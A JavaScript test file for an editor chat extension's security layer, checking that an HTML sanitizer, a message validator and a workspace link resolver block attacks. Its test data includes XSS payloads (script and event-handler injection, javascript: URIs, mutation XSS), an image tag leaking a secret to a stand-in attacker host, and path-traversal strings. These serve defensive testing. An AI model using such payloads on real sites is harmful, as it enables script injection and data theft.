const {test} = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const {JSDOM} = require('jsdom');
const {validMessage, localLink} = require('../security');

function browser() {
  const dom = new JSDOM('<div id="messages"></div>', {runScripts:'outside-only'});
  for (const name of ['purify.min.js', 'safe-html.js']) dom.window.eval(fs.readFileSync(path.join(__dirname,'../media',name),'utf8'));
  return dom;
}
test('stored XSS, DOM clobbering and automatic external requests are stripped', () => {
  const dom=browser(), w=dom.window;
  const payloads=[
    '<img src="https://attacker.invalid/leak?secret=fixture" onerror="alert(1)">',
    '<script>alert(1)</script><iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<a href="javascript:alert(1)">click</a><a href="command:workbench.action.terminal.new">cmd</a>',
    '<a href="java&#x09;script:alert(1)">click</a>',
    '<svg onload="alert(1)"><foreignObject><iframe src="https://attacker.invalid"></iframe></foreignObject></svg>',
    '<form id="messages" name="vscode"><input id="send" name="submit"></form>',
    '<style>body{display:none}</style><base href="https://attacker.invalid"><meta http-equiv="refresh" content="0;url=https://attacker.invalid">',
    '<img src="data:image/svg+xml;base64,PHN2Zz4=" srcset="https://attacker.invalid/x 2x">',
    '<p style="position:fixed;inset:0" nonce="forged" id="clear" onclick="alert(1)">overlay</p>',
    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
  ];
  for(const payload of payloads){
    const target=w.document.getElementById('messages');
    target.innerHTML=w.safeHtml(payload);
    assert.equal(target.querySelector('script,iframe,form,input,style,base,meta,foreignObject,math'),null);
    for(const element of target.querySelectorAll('*')) {
      for(const attr of element.attributes) assert(!/^on|^(id|name|style|nonce|srcset)$/i.test(attr.name),attr.name);
      assert(!/^(javascript|command|data):/i.test(element.getAttribute('href')||''));
      if(element.tagName==='IMG') assert.equal(element.getAttribute('src'),null);
    }
  }
  dom.window.close();
});
test('safe conversation formatting, attachments and diff copying survive', () => {
  const dom=browser(), w=dom.window;
  const html='<article class="message assistant"><details class="file-change" data-diff="+safe"><summary>Change</summary><pre><code>&lt;script&gt;literal code&lt;/script&gt;</code></pre></details><img src="data:image/png;base64,aGVsbG8="><a href="https://example.com">link</a></article>';
  const target=w.document.getElementById('messages');target.innerHTML=w.safeHtml(html);
  assert.equal(target.querySelector('code').textContent,'<script>literal code</script>');
  assert.equal(target.querySelector('details').dataset.diff,'+safe');
  assert.equal(target.querySelector('img').getAttribute('src'),'data:image/png;base64,aGVsbG8=');
  assert.equal(target.querySelector('a').getAttribute('rel'),'noopener noreferrer');
  dom.window.close();
});
test('bridge rejects malformed messages, traversal IDs and truthy string approvals', () => {
  for(const value of [null,[],{}, {type:'exec',command:'x'}, {type:'loadArchive',id:'../../etc'},
    {type:'approval',id:'fixture',allow:'false'}, {type:'prompt',text:'x',fullAccess:'true'},
    {type:'snapshot',conversation:'fixture',html:'x'.repeat(8*1024*1024+1)},
    {type:'prompt',text:'x',images:[{data_url:'https://attacker.invalid'}]}]) assert.equal(validMessage(value),false);
  assert(validMessage({type:'prompt',text:'normal request',fullAccess:false,model:'auto-balanced',images:[]}));
  assert(validMessage({type:'approval',id:'fixture',allow:false}));
  assert(validMessage({type:'snapshot',conversation:'fixture',html:'<p>saved</p>'}));
});
test('local links cannot escape the workspace through traversal, prefixes or symlinks', () => {
  const temp=fs.mkdtempSync(path.join(os.tmpdir(),'ovh-security-'));
  try {
    const root=path.join(temp,'workspace');fs.mkdirSync(root);
    const safe=path.join(root,'safe.txt'),outside=path.join(temp,'private.txt');
    fs.writeFileSync(safe,'public');fs.writeFileSync(outside,'private');
    fs.symlinkSync(outside,path.join(root,'escape.txt'));
    assert.equal(localLink('safe.txt',root),safe);
    assert.equal(localLink('file://'+safe,root),safe);
    for(const target of ['../private.txt','escape.txt','command:run','javascript:alert(1)','file://'+outside]) assert.equal(localLink(target,root),null);
  } finally {fs.rmSync(temp,{recursive:true,force:true});}
});

test('project path edits accept bounded absolute paths and reject malformed payloads',()=>{
 const base={type:'updateProject',project:'a'.repeat(20)};
 assert(validMessage({...base,root:'/home/coder/new folder'}));
 for(const root of ['',null,123,'relative','/home/coder/\npath','/'+ 'a'.repeat(4096)])assert.equal(validMessage({...base,root}),false);
});
